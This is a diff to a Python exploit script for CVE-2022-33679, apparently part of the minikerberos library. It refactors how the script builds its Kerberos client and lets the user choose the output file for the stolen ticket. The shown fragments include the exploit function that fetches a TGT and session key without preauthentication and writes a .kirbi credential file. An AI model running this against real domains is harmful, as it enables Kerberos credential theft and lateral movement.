@@ -19,7 +19,7 @@ import datetime
 import logging
 import asyncio
 import base64
-from minikerberos.common.url import KerberosClientURL, kerberos_url_help_epilog
+from minikerberos.common.factory import KerberosClientFactory, kerberos_url_help_epilog
 from minikerberos.aioclient import AIOKerberosClient
 from minikerberos.protocol.constants import EncryptionType
 from minikerberos.protocol.encryption import Key, _enctype_table
@@ -110,13 +110,10 @@ def tgt_to_kirbi(tgt, sessionkey, now):
 
 	return KRB_CRED(t)
 
-async def exploit(args):
-	cu = KerberosClientURL.from_url(args.kerberos_connection_url)
-	ccred = cu.get_creds()
-	target = cu.get_target()
-
+async def exploit(kerberos_url, kirbifile=None):
+	cu = KerberosClientFactory.from_url(kerberos_url)
 	print('[+] FETCHING TGT...')
-	client = AIOKerberosClient(ccred, target)
+	client = cu.get_client()
 	padding_data = {
 		'addresses' : get_padding_data()
 	}
@@ -207,6 +204,9 @@ async def exploit(args):
 	print('[+] KIRBI DATA:')
 	print(format_kirbi(kirbi))
 	filename = '%s.kirbi' % (now.strftime("%Y%m%d_%H%M%S"))
+	if kirbifile is not None:
+		filename = kirbifile
+	
 	print('[+] Writing .kirbi file to: %s' % filename)
 	with open(filename, 'wb') as f:
 		f.write(kirbi)
@@ -216,7 +216,7 @@ def main():
 	import argparse
 	
 	parser = argparse.ArgumentParser(description='Fetches TGT&session key for user who doesnt need kerberos preauth. CVE-2022-33679.', usage='Use it with a valid kerberus URL but any password. Example: "cve202233679 \'kerberos+none://TEST\\asreptest@10.10.10.2\'"')
-	parser.add_argument('kerberos_connection_url', help='the kerberos target string. ')
+	parser.add_argument('kerberos_url', help='the kerberos target string. ')
 	parser.add_argument('-v', '--verbose', action='count', default=0)
 	
 	args = parser.parse_args()
@@ -227,7 +227,7 @@ def main():
 	else:
 		logging.basicConfig(level=1)
 	
-	asyncio.run(exploit(args))
+	asyncio.run(exploit(args.kerberos_url))
 	
 	
 if __name__ == '__main__':
